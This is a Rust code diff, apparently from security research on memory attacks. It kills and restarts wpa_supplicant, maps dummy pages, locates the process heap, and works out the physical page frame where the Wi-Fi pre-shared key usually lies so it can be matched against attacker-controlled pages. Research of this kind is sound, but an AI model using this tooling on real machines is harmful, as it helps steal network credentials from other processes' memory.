@@ -1,13 +1,19 @@
-use std::process::{Command, id};
+use std::process::{id, Command, Stdio};
 use std::ptr::null_mut;
-use std::{fs::File, io::{Read, Seek, SeekFrom}, mem::size_of};
+use std::{time, fs::File, io::{Read, Seek, SeekFrom}, mem::size_of};
 use pagemap::maps;
-use libc::{c_void, mmap, munmap, sched_yield, sleep, sysconf, _SC_PAGESIZE};
+use libc::{c_void, mmap, munmap, sched_yield, sysconf, _SC_PAGESIZE};
 
 const DUMMY_PAGES: usize = 1500;
+const PROCESS_NAME: &str = "wpa_supplicant";
+const WPA_SUPPLICANT_PATH: &str = "/home/inoue/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant";
+const CONFIG_PATH: &str = "-c/home/inoue/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant.conf";
+const INTERFACE: &str = "-iwlx00c0ca991249";
 
 fn main() {
-    let service_name = "wpa_supplicant";
+    if get_process_id(PROCESS_NAME) > 0 {
+        kill_wpa_supplicant();
+    }
 
     // dummy page を確保
     let mut dummy_pages: Vec<(*mut c_void, u64)> = Vec::new();
@@ -23,53 +29,61 @@ fn main() {
     release_dummy_pages(&dummy_pages);
 
     // wpa_supplicant を起動 起動後少し待機
-    restart_service(service_name);
-    unsafe { sleep(3); }
+    start_wpa_supplicant();
 
-    let pid = get_pid(service_name);
+    println!("[+] start busy loop");
+    let now = time::Instant::now();
+    loop {
+        if now.elapsed().as_secs() > 10 { break; }
+    }
+    println!("[+] end busy loop");
+
+    let pid = get_process_id(PROCESS_NAME);
     println!("[+] pid = {}", pid);
 
     // wpa_supplicant の heap 領域の先頭アドレス
-    let base_addr = get_heap_start_address(pid);
+    let base_addr = get_heap_start_address(pid as u64);
     println!("[+] base_addr = {:x}", base_addr);
 
-    // PSK は base_addr から 0xc ページ後ろに置かれることが多い
-    let psk_addr = (base_addr + 0xc000) as *const c_void;
+    // PSK は base_addr から 0x5 ページ後ろに置かれることが多い
+    let psk_addr = (base_addr + 0x5000) as *const c_void;
     println!("[+] psk_addr = {:p}", psk_addr);
 
     // PSK が配置されたページの物理ページ番号を計算
-    let page_frame_number = v2p(pid, psk_addr) as u64;
+    let page_frame_number = v2p(pid as u64, psk_addr) as u64;
     println!("[+] page_frame_number = {:x}", page_frame_number);
-
-    // for p in &dummy_pages {
-    //     println!("[+] 0x{:x}", p.1);
-    // }
 
     calc_dummy_page(&dummy_pages, page_frame_number);
 
 }
 
-fn restart_service(service_name: &str) {
-    let status = Command::new("systemctl").arg("restart").arg(service_name).status().expect("failed to execute systemctl");
-    if !status.success() {
-        panic!("[-] failed to start {}", service_name);
-    }
-    println!("[+] start {}", service_name);
-}
-
-fn get_pid(service_name: &str) -> u64 {
-    let mut pid: u64 = 0;
-    let output = Command::new("systemctl")
-    .arg("status")
-    .arg(service_name)
-    .output()
-    .expect("failed to execute systemctl");
-    for line in String::from_utf8(output.stdout).unwrap().lines() {
-        if line.contains("PID") {
-            pid = line.chars().filter(|c| c.is_ascii_digit()).collect::<String>().parse().unwrap();
+fn get_process_id(process_name: &str) -> i32 {
+    let ps = Command::new("ps").arg("aux").stdout(Stdio::piped()).spawn().expect("ps failed");
+    let grep = Command::new("grep").arg(process_name).stdin(ps.stdout.unwrap()).output().expect("grep failed");
+    let mut pid = 0;
+    for line in String::from_utf8(grep.stdout).unwrap().lines() {
+        if !line.contains("grep") {
+            let res: Vec<&str> = line.split_whitespace().collect();
+            pid = res[1].parse::<i32>().unwrap();
         }
     }
     pid
+}
+
+fn start_wpa_supplicant() {
+    let cmd = Command::new(WPA_SUPPLICANT_PATH).arg(INTERFACE).arg(CONFIG_PATH).arg("-B").stdout(Stdio::null()).status().expect("failed to start wpa_supplicant");
+    if !cmd.success() {
+        panic!("[-] failed to start wpa_supplicant");
+    }
+    println!("[+] start wpa_supplicant");
+}
+
+fn kill_wpa_supplicant() {
+    let cmd = Command::new("killall").arg("wpa_supplicant").status().expect("killall failed");
+    if !cmd.success() {
+        panic!("[-] failed to kill wpa_supplicant");
+    }
+    println!("[+] kill wpa_supplicant");
 }
 
 fn get_heap_start_address(pid: u64) -> u64 {
@@ -78,6 +92,7 @@ fn get_heap_start_address(pid: u64) -> u64 {
     for m in map {
         if m.path() == Some("[heap]") {
             res = m.memory_region().start_address();
+            break;
         }
     }
     res
